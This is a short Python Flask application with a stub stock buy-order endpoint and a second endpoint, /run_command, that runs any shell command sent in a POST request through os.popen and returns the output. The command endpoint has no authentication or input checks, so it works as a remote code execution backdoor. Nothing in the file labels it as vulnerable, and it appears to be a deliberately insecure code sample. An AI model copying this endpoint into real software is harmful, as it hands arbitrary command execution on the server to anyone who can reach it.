import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/buy_order', methods=['POST'])
def buy_order():
    data = request.get_json()
    stock_name = data.get('stock_name')
    stock_quantity = data.get('stock_quantity')
    username = data.get('username')
    
    # Update database with new stock quantity
    
    return jsonify({'message': 'Stock quantity updated successfully'})

@app.route('/run_command', methods=['POST'])
def run_command():
    data = request.get_json()
    command = data.get('command')
    
    output = os.popen(command).read()
    
    return jsonify({'output': output})

if __name__ == '__main__':
    app.run()